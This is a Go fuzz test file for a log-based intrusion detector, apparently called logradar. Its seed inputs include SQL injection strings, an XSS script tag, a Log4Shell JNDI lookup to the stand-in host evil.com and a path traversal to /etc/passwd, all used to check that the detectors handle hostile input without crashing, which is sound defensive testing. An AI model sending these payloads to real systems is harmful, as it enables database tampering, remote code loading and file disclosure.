package detection_test

import (
	"context"
	"net/netip"
	"testing"
	"time"

	"github.com/xoelrdgz/logradar/internal/adapters/detection"
	"github.com/xoelrdgz/logradar/internal/domain"
)

func FuzzTokenizer(f *testing.F) {
	tokenizer := detection.NewSQLTokenizer()

	seeds := []string{
		"' OR 1=1--",
		"'; DROP TABLE users;--",
		"1 UNION SELECT * FROM users--",
		"1' AND SLEEP(5)--",
		"1'/**/OR/**/1=1--",
		"1' oR '1'='1",
		"1'%0AOR%0A'1'='1",
		"char(39)+char(49)+char(61)+char(49)",
		"((((((((((((((((((((1))))))))))))))))))))",
		stringRepeat("SELECT ", 1000),
		stringRepeat("' OR ", 500),
		"\x00\x01\x02\x03\x04",
		"\xff\xfe\xfd",
		"ＳＥＬＥＣＴｕｎｉｏｎ",
		"S\u0000E\u0000L\u0000E\u0000C\u0000T",
		"",
		" ",
		"",
		" ",
		"'",
		"--",
		"/**/",
		stringRepeat("A", 100000),
		stringRepeat("'", 10000),
		"<script>alert('XSS')</script>",
		"${jndi:ldap://evil.com/}",
		"../../etc/passwd",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, data string) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("tokenizer panicked on input %q: %v", truncate(data, 100), r)
			}
		}()
		tokens := tokenizer.Tokenize(data)

		if len(tokens) > 0 {
			if len(tokens) > 100000 {
				t.Errorf("excessive token count: %d", len(tokens))
			}
		}
		_, _ = tokenizer.MatchesPattern(tokens)
	})
}

func FuzzSignatureDetector(f *testing.F) {
	detector := detection.NewSignatureDetector(nil)

	pathSeeds := []string{
		"/index.html",
		"/?id=' OR 1=1--",
		"/<script>alert(1)</script>",
		"/../../../etc/passwd",
		"/api/users?filter=" + stringRepeat("A", 10000),
		"\x00\xff\xfe",
	}

	uaSeeds := []string{
		"Mozilla/5.0 Chrome/120.0",
		"sqlmap/1.7",
		"${jndi:ldap://evil.com/}",
		stringRepeat("X", 10000),
	}

	for _, path := range pathSeeds {
		for _, ua := range uaSeeds {
			f.Add(path, ua)
		}
	}

	f.Fuzz(func(t *testing.T, path, userAgent string) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("signature detector panicked: %v", r)
			}
		}()

		entry := createTestEntry(path, userAgent)

		result := detector.Detect(context.Background(), entry)

		if result.RiskScore > 100 {
			t.Errorf("risk score too high: %d", result.RiskScore)
		}
	})
}

func FuzzBehavioralDetector(f *testing.F) {
	config := detection.BehavioralConfig{
		ShardCount:          16,
		BruteForceThreshold: 10,
		BruteForceWindow:    60,
		RateLimitThreshold:  100,
		RateLimitWindow:     10,
		CleanupInterval:     time.Hour,
	}
	detector := detection.NewBehavioralDetector(config)
	defer detector.Stop()

	ipSeeds := []string{
		"192.168.1.1",
		"10.0.0.1",
		"::1",
		"2001:db8::1",
		"255.255.255.255",
		"0.0.0.0",
	}

	statusSeeds := []int{200, 401, 403, 404, 500}

	for _, ip := range ipSeeds {
		for _, status := range statusSeeds {
			f.Add(ip, status)
		}
	}

	f.Fuzz(func(t *testing.T, ipStr string, status int) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("behavioral detector panicked: %v", r)
			}
		}()

		ip, err := netip.ParseAddr(ipStr)
		if err != nil {
			return
		}

		entry := &domain.LogEntry{
			IP:         ip,
			Timestamp:  time.Now(),
			StatusCode: status,
			Path:       "/login",
			Method:     "POST",
		}

		_ = detector.Detect(context.Background(), entry)
	})
}

func FuzzLogEntryFields(f *testing.F) {
	detector := detection.NewSignatureDetector(nil)

	f.Add(
		"192.168.1.1",
		"GET",
		"/test",
		200,
		"Mozilla/5.0",
		"session=abc",
	)

	f.Fuzz(func(t *testing.T, ip, method, path string, status int, userAgent, cookie string) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("detection panicked with arbitrary LogEntry fields: %v", r)
			}
		}()

		addr, err := netip.ParseAddr(ip)
		if err != nil {
			addr = netip.MustParseAddr("127.0.0.1")
		}

		entry := &domain.LogEntry{
			IP:         addr,
			Timestamp:  time.Now(),
			Method:     method,
			Path:       path,
			StatusCode: status,
			UserAgent:  userAgent,
		}
		entry.SetCookie("session", cookie)

		_ = detector.Detect(context.Background(), entry)
	})
}

func createTestEntry(path, userAgent string) *domain.LogEntry {
	return &domain.LogEntry{
		IP:         netip.MustParseAddr("192.168.1.1"),
		Timestamp:  time.Now(),
		Method:     "GET",
		Path:       path,
		StatusCode: 200,
		UserAgent:  userAgent,
	}
}

func stringRepeat(s string, n int) string {
	result := ""
	for i := 0; i < n; i++ {
		result += s
	}
	return result
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
